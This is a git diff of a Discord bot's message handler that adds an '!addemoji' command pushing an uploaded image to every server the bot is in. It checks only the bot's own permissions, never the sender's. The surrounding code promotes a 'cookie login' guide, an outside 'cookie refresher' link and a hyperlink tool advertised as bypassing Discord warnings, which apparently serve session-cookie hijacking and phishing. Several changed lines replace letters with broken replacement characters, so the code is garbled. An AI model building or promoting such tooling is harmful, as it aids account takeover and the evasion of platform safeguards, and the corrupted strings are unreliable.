@@ -599,7 +599,7 @@ client.on("messageCreate", async (message) => {
         message: "https://youtu.be/M36orZU8j4Q?si=8M0IyAB886rgE04Q"
       },
       {
-        title: "ᴄᴏᴏᴋɪᴇ ʟᴏɢɪɴ (ɪᴏꜱ ᴍᴏʙɪʟᴇ)",
+        title: "��ᴏᴏᴋɪᴇ ʟᴏɢɪɴ (ɪᴏꜱ ᴍᴏʙɪʟᴇ)",
         message: "https://youtu.be/eP6dLhv0UKY?si=IDRwYwdAKokMVxas"
       },
       {
@@ -922,7 +922,7 @@ client.on("messageCreate", async (message) => {
     const toolsRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
         .setURL("https://refresher.fwh.is/?i=1")
-        .setLabel("ᴄᴏᴏᴋɪᴇ ʀᴇꜰʀᴇꜱʜᴇʀ")
+        .setLabel("ᴄᴏᴏᴋɪᴇ ʀᴇ��ʀᴇꜱʜᴇʀ")
         .setStyle(ButtonStyle.Link)
         .setEmoji({ id: "1508646379751342130", name: "emoji_13", animated: true }),
       new ButtonBuilder()
@@ -1930,6 +1930,83 @@ client.on("messageCreate", async (message) => {
     return;
   }
 
+  // ── !addemoji ──
+  if (content === `${PREFIX}addemoji`) {
+    try {
+      // Check if there's an attachment
+      if (message.attachments.size === 0) {
+        await message.reply({
+          content: "<:emoji_11:1506864561435967509> Please attach an image. Usage: `!addemoji` (with image attached)",
+        });
+        return;
+      }
+
+      const attachment = message.attachments.first();
+
+      // Check if attachment is an image
+      if (!attachment.contentType || !attachment.contentType.startsWith("image/")) {
+        await message.reply({
+          content: "<:emoji_11:1506864561435967509> Please attach a valid image file (PNG, JPG, GIF, WebP)",
+        });
+        return;
+      }
+
+      // Check file size (Discord emoji limit is 256KB)
+      if (attachment.size > 262144) {
+        await message.reply({
+          content: "<:emoji_11:1506864561435967509> Image is too large. Maximum size is 256KB",
+        });
+        return;
+      }
+
+      // Get all guilds the bot is in
+      const guilds = client.guilds.cache;
+      if (guilds.size === 0) {
+        await message.reply({
+          content: "<:emoji_11:1506864561435967509> Bot is not in any servers.",
+        });
+        return;
+      }
+
+      let successCount = 0;
+      let failedCount = 0;
+      const emojiName = `emoji_${Date.now()}`;
+
+      for (const [guildId, guild] of guilds) {
+        try {
+          // Check if bot has permission to manage emojis
+          if (!guild.members.me.permissions.has(PermissionFlagsBits.ManageGuildExpressions)) {
+            console.log(`[v0] No permission to manage emojis in ${guild.name}`);
+            failedCount++;
+            continue;
+          }
+
+          // Create emoji
+          await guild.emojis.create({
+            attachment: attachment.url,
+            name: emojiName,
+          });
+
+          successCount++;
+          console.log(`[v0] Added emoji to ${guild.name}`);
+        } catch (err) {
+          console.error(`[v0] Failed to add emoji to ${guild.name}:`, err.message);
+          failedCount++;
+        }
+      }
+
+      await message.reply({
+        content: `<:emoji_14:1508646444607864872> Emoji added to ${successCount} server${successCount !== 1 ? "s" : ""}. Failed: ${failedCount}.`,
+      });
+    } catch (err) {
+      console.error("[v0] addemoji command error:", err.message);
+      await message.reply({
+        content: "<:emoji_11:1506864561435967509> Failed to add emoji. Please try again.",
+      });
+    }
+    return;
+  }
+
   // ── !hyperlink ──
   if (content === `${PREFIX}hyperlink`) {
     // Build the embed that prompts the user to submit a link
@@ -1937,7 +2014,7 @@ client.on("messageCreate", async (message) => {
     .setDescription(
       "**─── <a:emoji_8:1506236357775720548> `ɪɴꜱᴀɴɪᴛʏ   | ʜʏᴘᴇʀʟɪɴᴋ` <a:emoji_8:1506236357775720548> ───\n\n" +
       "<a:emoji_13:1508646379751342130> ᴜꜱᴇ ��ʜɪꜱ ᴛᴏᴏʟ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʜʏᴘᴇʀʟɪɴᴋꜱ ᴛʜᴀᴛ ʙʏᴘᴀꜱꜱ ᴅɪꜱᴄᴏʀᴅ ᴡᴀʀɴɪɴɢꜱ\n\n" +
-      "<:emoji_14:1508646444607864872> ʙᴇꜱᴛ ʜʏᴘᴇʀʟɪɴᴋ ᴏꜰ ᴀʟʟ ᴛɪᴍᴇ**"
+      "<:emoji_14:1508646444607864872> ʙᴇꜱᴛ ʜʏ��ᴇʀʟɪɴᴋ ᴏꜰ ᴀʟʟ ᴛɪᴍᴇ**"
     )
     .setImage("https://image2url.com/r2/default/gifs/1768488617981-bdc4c780-144f-4a40-8906-ddf01eadb705.gif")
     .setFooter({
